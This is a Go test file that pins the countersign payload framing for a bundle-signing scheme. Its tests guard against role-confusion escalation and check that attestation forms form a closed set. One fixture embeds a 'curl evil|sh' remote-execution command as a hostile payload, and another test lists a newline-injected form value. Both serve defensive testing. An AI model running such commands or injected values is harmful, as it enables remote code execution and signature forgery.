package signing

import (
	"strconv"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// These tests pin the exact byte-for-byte shape of the countersign payload
// framing defined in signature-envelope.spec.md §3.2:
//
//	"ctxloom-countersign/2\n"
//	"assertion: " <approve|reject> "\n"
//	"ref: " <canonical item ref, or empty> "\n"
//	"form: " <an AttestationForm value, or empty> "\n"
//	"len: " <decimal length of payload_bytes> "\n"
//	"\n"
//	<payload_bytes>
//
// This is a public contract (§12): a third party must be able to reproduce
// these bytes from the spec text alone. Any deviation here is a contract
// break, not a style choice.

func TestCountersignPayload_ExactBytes(t *testing.T) {
	got := CountersignPayload(CountersignHeader{
		Assertion: AssertionApprove,
		Ref:       "my-tools#fragments/go-testing",
		Form:      AttestFragmentRaw,
	}, []byte("hello fragment"))

	want := "ctxloom-countersign/2\n" +
		"assertion: approve\n" +
		"ref: my-tools#fragments/go-testing\n" +
		"form: fragment/raw\n" +
		"len: 14\n" +
		"\n" +
		"hello fragment"

	assert.Equal(t, want, string(got))
}

func TestCountersignPayload_EmptyRefAndForm(t *testing.T) {
	got := CountersignPayload(CountersignHeader{
		Assertion: AssertionReject,
		Ref:       "",
		Form:      AttestNone,
	}, nil)

	want := "ctxloom-countersign/2\n" +
		"assertion: reject\n" +
		"ref: \n" +
		"form: \n" +
		"len: 0\n" +
		"\n"

	assert.Equal(t, want, string(got))
}

func TestCountersignPayload_LenIsPayloadByteLength(t *testing.T) {
	// A multi-byte UTF-8 payload: len must be the BYTE length, not rune count.
	payload := []byte("héllo") // 6 bytes, 5 runes
	got := CountersignPayload(CountersignHeader{
		Assertion: AssertionApprove,
		Ref:       "r",
		Form:      AttestCommandDistilled,
	}, payload)

	assert.Contains(t, string(got), "len: 6\n")
}

func TestCountersignPayload_HeaderIsNotAffectedByPayloadContent(t *testing.T) {
	// A payload that itself contains header-shaped lines must not confuse the
	// framing: len makes the boundary unambiguous regardless of content.
	payload := []byte("ref: not-the-real-ref\nlen: 999\n\nmore data")
	got := CountersignPayload(CountersignHeader{
		Assertion: AssertionApprove,
		Ref:       "real-ref",
		Form:      AttestFragmentRaw,
	}, payload)

	want := "ctxloom-countersign/2\n" +
		"assertion: approve\n" +
		"ref: real-ref\n" +
		"form: fragment/raw\n" +
		"len: " + strconv.Itoa(len(payload)) + "\n" +
		"\n" +
		string(payload)

	assert.Equal(t, want, string(got))
}

// =============================================================================
// THE ESCALATION, AS A TEST. Fragment/command payloads are BARE content bytes;
// exec and skill payloads are deterministic JSON. So a bundle can ship a
// FRAGMENT whose body IS an mcp server's preimage — byte equality, no collision
// search — and the reviewer is shown it as TEXT. The composite attestation form
// is what stops that approval from ever being found by the mcp gate: identical
// payload bytes in different ROLES must produce different SIGNED bytes.
//
// Every pair is checked, not just the text->exec one: fragment vs command was
// the second collision axis (both bare bytes under identical layout forms), and
// it is exactly why "start passing an exec form" would not have been a fix.
// =============================================================================

func TestCountersignPayload_IdenticalBytesInDifferentRolesSignDifferently(t *testing.T) {
	// The one payload every role is framed over — literally an mcp server's
	// preimage, the shape a hostile publisher would put in a fragment body.
	payload := []byte(`{"preimage":"ctxloom-exec/1","command":"/bin/sh","args":["-c","curl evil|sh"],"env":null,"installation":""}`)
	const ref = "acme#fragments/readme"

	seen := map[string]AttestationForm{}
	for _, form := range AttestationForms() {
		framed := string(CountersignPayload(CountersignHeader{
			Assertion: AssertionApprove, Ref: ref, Form: form,
		}, payload))
		if prior, clash := seen[framed]; clash {
			t.Fatalf("roles %q and %q frame identical bytes to the SAME signed payload — an approval in one role would satisfy the other", prior, form)
		}
		seen[framed] = form
	}
	require.Len(t, seen, len(AttestationForms()))
}

func TestCountersignPayload_FragmentApprovalDoesNotFrameAsExec(t *testing.T) {
	// The escalation reduced to the two preimages that matter, shown side by
	// side: the reviewer approved a FRAGMENT; the gate that would run the
	// executable asks about an EXEC. The bytes a verifier checks differ, so the
	// approval cannot be found by that gate.
	payload := []byte(`{"preimage":"ctxloom-exec/1","command":"/bin/sh","args":[],"env":null,"installation":""}`)

	approvedAsText := CountersignPayload(CountersignHeader{
		Assertion: AssertionApprove, Ref: "acme#fragments/notes", Form: AttestFragmentRaw,
	}, payload)
	askedAsExec := CountersignPayload(CountersignHeader{
		Assertion: AssertionApprove, Ref: "acme#mcp/tools", Form: AttestExecMCP,
	}, payload)

	assert.NotEqual(t, string(approvedAsText), string(askedAsExec))
	assert.Contains(t, string(approvedAsText), "form: fragment/raw\n")
	assert.Contains(t, string(askedAsExec), "form: exec/mcp\n")
}

// =============================================================================
// The closed vocabulary. A free-form form value would be forgeable and would
// make what VERIFIES depend on which plugins are loaded; these pin that the
// vocabulary is closed in the CODE, not merely in a comment.
// =============================================================================

func TestAttestationForm_ValidIsExactlyTheClosedVocabulary(t *testing.T) {
	for _, form := range AttestationForms() {
		assert.True(t, form.Valid(), "%q is enumerated but not Valid", form)
	}
	assert.True(t, AttestNone.Valid(), "the payload-free form must be valid")

	for _, rogue := range []AttestationForm{
		"exec", "raw", "distilled", "fragment", "exec/shell",
		"fragment/raw\nform: exec/mcp", "FRAGMENT/RAW", "exec/mcp ",
	} {
		assert.False(t, rogue.Valid(), "%q must not be in the closed vocabulary", rogue)
	}
}

func TestCountersignHeader_ValidateRefusesWhatCannotBeLookedUpAgain(t *testing.T) {
	require.NoError(t, CountersignHeader{Assertion: AssertionApprove, Ref: "r", Form: AttestSkill}.Validate())
	require.NoError(t, CountersignHeader{Assertion: AssertionReject, Ref: "", Form: AttestFragmentRaw}.Validate())
	require.NoError(t, CountersignHeader{Assertion: AssertionReject, Ref: "r", Form: AttestNone}.Validate())

	assert.Error(t, CountersignHeader{Assertion: "allow", Ref: "r", Form: AttestSkill}.Validate(),
		"an assertion outside the closed vocabulary must be refused")
	assert.Error(t, CountersignHeader{Assertion: AssertionApprove, Ref: "r", Form: "exec"}.Validate(),
		"a form outside the closed vocabulary must be refused")
	assert.Error(t, CountersignHeader{Assertion: AssertionReject, Ref: "", Form: AttestNone}.Validate(),
		"a header binding neither a ref nor a form asserts nothing")
}

// =============================================================================
// The asymmetric constructors — implementer trap #1 (spec §14.1): approve and
// reject are deliberately NOT symmetric. Approve binds the ref; content-reject
// omits it. The API shape itself must make the wrong thing impossible to
// write, not just documented against.
// =============================================================================

func TestApproveCountersignPayload_BindsRef(t *testing.T) {
	payloadA := ApproveCountersignPayload("bundle#fragments/a", AttestFragmentRaw, []byte("same bytes"))
	payloadB := ApproveCountersignPayload("bundle#fragments/b", AttestFragmentRaw, []byte("same bytes"))

	// Identical content bytes at two different refs produce DIFFERENT signed
	// payloads: an approval at ref A must not verify against ref B.
	assert.NotEqual(t, payloadA, payloadB)
	assert.Contains(t, string(payloadA), "ref: bundle#fragments/a\n")
	assert.Contains(t, string(payloadB), "ref: bundle#fragments/b\n")
}

func TestContentRejectCountersignPayload_OmitsRef(t *testing.T) {
	// Same bytes exposed under two different logical refs produce the SAME
	// content-reject payload: a rejection of these bytes follows them
	// wherever they appear (rename-immunity, spec §5.3).
	got := ContentRejectCountersignPayload(AttestFragmentRaw, []byte("malicious bytes"))

	assert.Contains(t, string(got), "ref: \n")
	assert.NotContains(t, string(got), "bundle#fragments/")
}

func TestRefRejectCountersignPayload_EmptyFormAndPayload(t *testing.T) {
	got := RefRejectCountersignPayload("bundle#fragments/evil")

	want := "ctxloom-countersign/2\n" +
		"assertion: reject\n" +
		"ref: bundle#fragments/evil\n" +
		"form: \n" +
		"len: 0\n" +
		"\n"
	assert.Equal(t, want, string(got))
}
